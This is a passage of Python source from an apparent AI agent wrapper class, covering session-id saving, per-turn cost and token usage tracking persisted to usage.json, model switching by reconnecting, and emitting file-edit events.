                    session_id = getattr(message, "session_id", None)
                    if session_id and session_id != self._session_id:
                        self._session_id = session_id
                        self._save_session(session_id)
                    self._record_usage(message)
                    await self._emit({
                        "type": "done",
                        "subtype": message.subtype,
                        "costUsd": getattr(message, "total_cost_usd", None),
                        "durationMs": getattr(message, "duration_ms", None),
                        "usage": self.usage,
                    })
                    self._last_used = time.monotonic()
                    return

    # -- usage -------------------------------------------------------------
    @property
    def usage_path(self) -> Path:
        return self.state_dir / "usage.json"

    def _load_usage(self) -> dict:
        blank = {
            "turns": 0, "costUsd": 0.0, "inputTokens": 0, "outputTokens": 0,
            "cacheReadTokens": 0, "durationMs": 0, "model": self.model or "default",
        }
        try:
            saved = json.loads(self.usage_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return blank
        return {**blank, **{k: v for k, v in saved.items() if k in blank}}

    def _record_usage(self, message: Any) -> None:
        counts = getattr(message, "usage", None) or {}
        self.usage["turns"] += 1
        self.usage["costUsd"] += getattr(message, "total_cost_usd", None) or 0.0
        self.usage["durationMs"] += getattr(message, "duration_ms", None) or 0
        self.usage["inputTokens"] += counts.get("input_tokens", 0) or 0
        self.usage["outputTokens"] += counts.get("output_tokens", 0) or 0
        self.usage["cacheReadTokens"] += (
            counts.get("cache_read_input_tokens", 0) or 0
        )
        self.usage["model"] = self.model or "default"
        try:
            temp = self.usage_path.with_suffix(".json.tmp")
            temp.write_text(json.dumps(self.usage, indent=2), encoding="utf-8")
            temp.replace(self.usage_path)
        except OSError:
            pass

    async def set_model(self, model: str | None) -> None:
        """Change the model this project's agent uses.

        The client carries the model it was started with, so this ends the
        current one; the next question starts a fresh client, which resumes
        the same conversation from its stored session id.  Nothing in the
        transcript is lost.
        """
        if (model or None) == (self.model or None):
            return
        self.model = model or None
        await self.disconnect()

    async def _flush_edits(self) -> None:
        for edit in self.drain_edits():
            await self._emit({
                "type": "edit",
                "path": edit.path,
                "before": edit.before,
                "after": edit.after,
            })
